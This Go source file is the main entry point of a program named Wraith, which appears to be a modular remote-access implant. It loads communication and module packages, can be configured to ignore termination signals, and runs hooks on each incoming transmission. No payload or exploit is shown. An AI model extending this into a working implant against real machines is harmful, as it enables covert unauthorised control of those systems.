package main

import (
	"os"
	"os/signal"
	"syscall"
	"time"

	"git.0x1a8510f2.space/0x1a8510f2/wraith/comms"
	"git.0x1a8510f2.space/0x1a8510f2/wraith/config"
	"git.0x1a8510f2.space/0x1a8510f2/wraith/hooks"

	// Registers a hook to handle incoming transmissions
	_ "git.0x1a8510f2.space/0x1a8510f2/wraith/proto"

	// Imports all modular code and keeps track of it
	_ "git.0x1a8510f2.space/0x1a8510f2/wraith/modmgr"
)

// Useful globals
var StartTime time.Time

// Exit handling
var exitTrigger chan struct{}

func setupCloseHandler() {
	c := make(chan os.Signal)
	signal.Notify(
		c,
		syscall.SIGHUP,
		syscall.SIGINT,
		syscall.SIGQUIT,
		syscall.SIGTERM,
	)
	go func() {
		<-c
		if config.Config.Process.RespectExitSignals {
			exitTrigger <- struct{}{}
		}
	}()
}

func init() {
	StartTime = time.Now()
	exitTrigger = make(chan struct{})
	setupCloseHandler()
}

func main() {
	// Run OnStart hooks
	hooks.RunOnStart()

	// Run OnExit hooks always on exit
	defer hooks.RunOnExit()

	// Mainloop: Transmit, receive and process stuff
	for {
		// TODO: Find what is concurrent and what is not to catch points where Wraith can break/stall
		select {
		case rx := <-comms.UnifiedRxQueue:
			// When data is received, run the OnRx handlers
			_ = hooks.RunOnRx(rx.Data) // TODO: Handle the returned value
		case <-exitTrigger:
			return
		}
	}

}
